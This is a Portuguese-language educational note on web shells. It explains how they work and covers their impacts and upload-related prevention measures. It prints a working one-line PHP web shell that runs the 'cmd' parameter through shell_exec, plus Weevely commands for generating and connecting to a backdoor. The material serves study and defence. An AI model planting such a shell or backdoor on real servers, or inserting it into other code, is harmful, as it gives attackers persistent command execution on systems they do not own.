## 🌐 WebShell

### 🧠 O que é WebShell?

Uma **WebShell** é um script malicioso ou backdoor hospedado em um servidor web que permite ao atacante **interagir com o sistema operacional por meio de requisições HTTP/HTTPS**.

Normalmente, a WebShell é obtida após a exploração de outra vulnerabilidade, como:

- Upload de arquivo inseguro
- RCE (Remote Code Execution)
- LFI/RFI
- Injeção de código
- Falhas de configuração

👉 Em outras palavras: **a vulnerabilidade fornece a entrada; a WebShell pode fornecer uma interface persistente para executar ações no servidor.**

---

## ⚙️ Como funciona

Um cenário comum:

```text
Atacante
   │
   │ HTTP/HTTPS
   ▼
Aplicação Web
   │
   ▼
WebShell
   │
   ▼
Sistema Operacional
```

A WebShell recebe comandos através de parâmetros HTTP e os executa com as permissões do processo do servidor web.

---

## 📌 Exemplo simples

Uma implementação vulnerável poderia ter uma estrutura semelhante a:

```php
<?php
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
```

Uma requisição como:

```http
GET /shell.php?cmd=whoami
```

poderia retornar:

```text
www-data
```

Isso demonstra que o servidor está executando comandos fornecidos pela requisição.

---

## 🔎 Exploração

### 🔹 Weevely

O **Weevely** é uma ferramenta utilizada para gerar e interagir com WebShells em ambientes de teste.

```bash
weevely generate password123 shell.php
```

Depois, a conexão pode ser realizada com:

```bash
weevely http://localhost/shell.php password123
```

📌 Em um laboratório, isso permite estudar como uma WebShell pode ser utilizada depois que um arquivo executável é colocado no servidor.

---

## 🚨 Impactos

Dependendo das permissões do processo web, uma WebShell pode permitir:

- execução de comandos;
- leitura de arquivos;
- alteração de arquivos;
- coleta de informações do sistema;
- acesso a variáveis de ambiente;
- movimentação dentro da infraestrutura;
- instalação de outros componentes maliciosos;
- persistência.

⚠️ O impacto depende principalmente das **permissões do usuário que executa o servidor web**.

---

## 🛡️ Como prevenir

- Restringir upload de arquivos;
- Não permitir execução de scripts em diretórios de upload;
- Validar extensão e conteúdo dos arquivos;
- Armazenar uploads fora do diretório web;
- Aplicar permissões mínimas ao usuário do servidor;
- Utilizar allow-list de extensões;
- Monitorar alterações em arquivos;
- Utilizar WAF/IDS quando apropriado;
- Manter o servidor e seus componentes atualizados.

📌 **Regra de ouro:**

👉 **Um arquivo enviado pelo usuário nunca deve ser tratado automaticamente como código executável.**